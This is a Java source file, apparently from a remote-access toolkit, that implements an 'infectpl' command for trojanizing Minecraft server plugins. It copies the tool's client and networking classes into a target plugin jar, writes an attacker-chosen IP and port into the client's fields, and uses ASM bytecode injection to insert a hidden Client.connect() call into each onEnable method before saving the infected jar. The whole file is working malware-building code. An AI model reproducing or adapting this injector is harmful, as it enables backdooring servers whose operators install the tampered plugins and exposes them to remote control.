package net.vitox.command.commands;

import net.vitox.Main;
import net.vitox.client.Client;
import net.vitox.command.Command;
import net.vitox.utils.ASMUtils;
import net.vitox.utils.JarUtils;
import net.vitox.utils.SendUtil;
import okhttp3.OkHttpClient;
import okio.Okio;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;

public class InfectPluginCommand extends Command {

    public InfectPluginCommand() {
        super("infectpl", "Infect a MC Plugin");
    }

    public ArrayList<ClassNode> nodes = new ArrayList<>();

    @Override
    public void runCommand(String[] args) {

        if (args.length <= 4) {
            System.out.println("Missing arguments: .infectpl <ip> <port> <path_to_jar> <output_path_jar>");
            return;
        }

        try {
            HashMap<String, byte[]> out = new HashMap<>();

            JarUtils.loadClasses(new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())).forEach((name, c) -> {
                if (
                        c.name.contains(Client.class.getPackage().getName().replaceAll("\\.", "/"))
                                || c.name.contains(OkHttpClient.class.getPackage().getName().replaceAll("\\.", "/"))
                                || c.name.contains(Okio.class.getPackage().getName().replaceAll("\\.", "/"))
                                || c.name.contains("tk/pratanumandal")
                                || c.name.contains("org/objectweb")
                                || c.name.contains(SendUtil.class.getPackage().getName().replaceAll("\\.", "/"))
                                || c.name.contains("org/apache")) {

                    nodes.add(c);
                }
            });

            JarUtils.loadClasses(new File(args[3])).forEach((name, c) -> {
                nodes.add(c);
            });

            JarUtils.loadNonClassEntries(new File(args[3])).forEach((name, c) -> {
                out.put(name, c);
            });

            for (ClassNode cn : nodes) {

                if (!args[1].equals("null")) {
                    for (FieldNode field : cn.fields) {
                        if (field.name.equals(Client.class.getFields()[0].getName())) { //IP_ADDRESS
                            field.value = args[1];
                        }

                        if (field.name.equals(Client.class.getFields()[1].getName())) { //PORT
                            field.value = args[2];
                        }
                    }
                }

                for (MethodNode mv : cn.methods) {
                   if (mv.name.equals("onEnable")) {

                       InsnList ins = new InsnList();

                       ins.add(new TypeInsnNode(Opcodes.NEW, Client.class.getName().replaceAll("\\.", "/")));
                       ins.add(new InsnNode(Opcodes.DUP));
                       ins.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, Client.class.getName().replaceAll("\\.", "/"), "<init>", "()V"));
                       ins.add(new VarInsnNode(Opcodes.ASTORE, 1));

                       ins.add(new VarInsnNode(Opcodes.ALOAD, 1));
                       ins.add(new MethodInsnNode(Opcodes.INVOKEVIRTUAL, Client.class.getName().replaceAll("\\.", "/"), "connect", "()V"));

                       mv.instructions.insert(ins);
                   }
                }
            }

            nodes.forEach(c1 -> {
                byte[] b = ASMUtils.getNodeBytes0(c1);
                if (b != null)
                    out.put(c1.name + ".class", b);
            });

            JarUtils.saveAsJar(out, args[4], false);
            System.out.println("Success! Saved jar to " + args[4]);

            nodes.clear();
            out.clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
